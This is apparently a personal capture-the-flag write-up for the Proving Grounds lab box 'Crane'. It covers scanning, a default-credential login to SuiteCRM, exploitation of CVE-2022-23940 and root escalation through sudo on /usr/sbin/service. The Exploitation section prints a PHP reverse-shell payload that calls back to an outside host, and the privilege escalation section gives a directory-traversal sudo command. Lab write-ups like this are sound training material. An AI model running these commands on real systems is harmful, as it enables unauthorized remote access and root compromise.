---
Date: 2024-10-07
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.137.146
Writeup: https://medium.com/@halfcircassian/offsec-proving-grounds-crane-walkthrough-f867bc9d442e
---
# Crane
This was the most straight-forward box so far. While a walkthrough was referenced for some of the exploit syntax, the exploit itself had already been found and tested before hand, so catching the reverse shell was straightforward.

After initial access, it was clear `usr/sbin/service` could be used for privilege escalation. It took a bit of testing, but combining `www-data`'s sudo privileges with directory traversal led to `root` access

# Resolution summary
- Scanned with Nmap to find ports 22, 80, & 3306
- Navigated to `http://192.168.137.146:80` 
- Password guessed admin login, and identified SuiteCRM 7.12.3
- Found exploit for CVE-2022-23940, executed against target & achieved shell
- Checked sudo privileges and found `/usr/sbin/services`
- Used `sbin` & directory traversal to escalate to `root`
## Improved skills
- Finding/testing exploits
- Linux Privilege Escalation
## Used tools
- Nmap
- NetCat

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN crane.nmap 192.168.137.146 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: ED9A8C7810E8C9FB7035B6C3147C9A3A
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP (Apache)
- Navigated to `http://192.168.137.146:80` & identified `SugarCRM`
![[Pasted image 20241007155353.png]]
- Password guessed `admin:admin` and accessed Admin Dashboard
![[Pasted image 20241007160513.png]]
- Navigated to "About" and confirmed `SuiteCRM v7.12.3` & `Suger v6.5.25 (Build 344)`
	- Potentially vulnerable to [`EBD-ID:51187`](https://www.exploit-db.com/exploits/51187) (requires credentials)
	- Potentially vulnerable to [CVE-2024-36412](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36412)
	- Potentially vulnerable to [CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)
![[Pasted image 20241007161814.png]]
- Inspected `robots.txt`
![[Pasted image 20241007155610.png]]
- Attempted to navigate to `/ical_server.php`
![[Pasted image 20241007155653.png]]
- Re-entered `admin:admin` and downloaded `ical_server.ics`
![[Pasted image 20241007160822.png]]
## Port 3306 - MYSQL
- Attempted to re-use `admin:admin` credentials
![[Pasted image 20241007161053.png]]

---
# Exploitation
- Identified exploit for [CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)
- Copied exploit, executed against target: 
`./exploit.py -h http://192.168.137.146/ -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.160\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"`
![[Pasted image 20241007163321.png]]
- Caught reverse shell with NetCat:
![[Pasted image 20241007163458.png]]
---
# Privilege Escalation
## Local Enumeration
- Upgraded to Full TTY and printed `local.txt`
![[Pasted image 20241007163641.png]]
- Checked `sudo -l`
![[Pasted image 20241007163902.png]]
## Privilege Escalation vector
- Identified `www-data` can run system services without password
- Attempted to abuse sudo with directory traversal to maintain privileges: `sudo /usr/sbin/service ../../../../../../../bin/bash`
![[Pasted image 20241007164937.png]]
- Navigated to `/root` and printed `proof.txt`
![[Pasted image 20241007165127.png]]
---
# Trophy & Loot
`local.txt` = `2847b6fff8e4463e6cfb2ecae2e0ec97`
`root.txt` = `698934849f240865f3ef3ec8aa705eac`